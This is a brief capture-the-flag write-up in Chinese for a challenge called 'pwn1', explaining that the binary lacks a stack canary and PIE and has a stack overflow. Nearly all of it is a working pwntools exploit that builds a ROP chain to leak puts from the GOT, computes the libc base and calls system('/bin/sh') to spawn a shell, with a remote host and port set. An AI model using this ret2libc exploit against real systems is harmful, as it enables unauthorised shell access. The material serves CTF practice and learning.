## 宇宙无敌难(jian)搞(dan) / pwn1
确实很jiandan，没有开canary没有开PIE还有栈溢出，只是在溢出的时候维护一下下标就行了
```python
from pwn import *
context.log_level = 'debug'
local = 1
if local:
	p = process('./pwn1')
	elf = ELF('./pwn1')
	libc = elf.libc
else:
	p = remote("183.129.189.60","10026")
	elf = ELF('./pwn1')
	libc = elf.libc

sd = lambda s:p.send(s)
sl = lambda s:p.sendline(s)
rc = lambda s:p.recv(s)
ru = lambda s:p.recvuntil(s)
sda = lambda a,s:p.sendafter(a,s)
sla = lambda a,s:p.sendlineafter(a,s)

main = 0x4007BF
pop_rdi = 0x400873
pop_rsi_r15 = 0x400871
pay = 0x10c*'a' + '\x18'
pay += p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts'])
pay += p64(main)
# gdb.attach(p,"b *0x40068E")
sla("fun!\n",pay)
puts_addr = u64(rc(6).ljust(8,'\x00'))
libc_base = puts_addr - libc.symbols['puts']
system = libc_base + libc.symbols['system']
binsh = libc_base + libc.search("/bin/sh").next()
log.success("puts_addr --> %s",hex(puts_addr))

pay = 0x10c*'a' + '\x18'
pay += p64(pop_rdi) + p64(binsh)
pay += p64(system)
# gdb.attach(p,"b *0x40068E")
sla("fun!\n",pay)
p.interactive()
```